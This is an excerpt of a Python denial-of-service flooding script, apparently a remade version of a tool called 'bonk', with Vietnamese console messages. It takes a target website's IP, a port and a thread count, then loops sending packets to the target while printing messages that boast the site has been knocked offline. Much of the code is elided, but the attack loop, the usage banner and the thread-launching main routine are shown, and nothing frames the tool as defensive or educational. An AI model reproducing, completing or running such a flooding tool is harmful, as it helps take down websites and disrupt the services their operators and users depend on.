...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94m đang bonk\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m bonk bonk \033[0m")
			else:
				s.shutdown(1)
				print("\033[91 múa yasuo mượt quá, shutdown web rồi\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m không vào được, có thể web đã bị méo\033[0m")
...
def usage():
	print (Fore.RED + '''
BONK BONK, REMADE BY THÀNH LỎ
\033[92m
	CÁCH DÙNG : python bonk.py  [-s] [-p] [-t]
	-s : ip web target
	-p : port mặc định 80
	-t : turbo mặc định 135   \033[92m
	''')
	sys.exit()
...
if __name__ == '__main__':
	...
	print("\033[94m đợi lấy gậy...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		...
		print("\033[91m xem lại sever và port\033[0m")
		usage()
	while True:
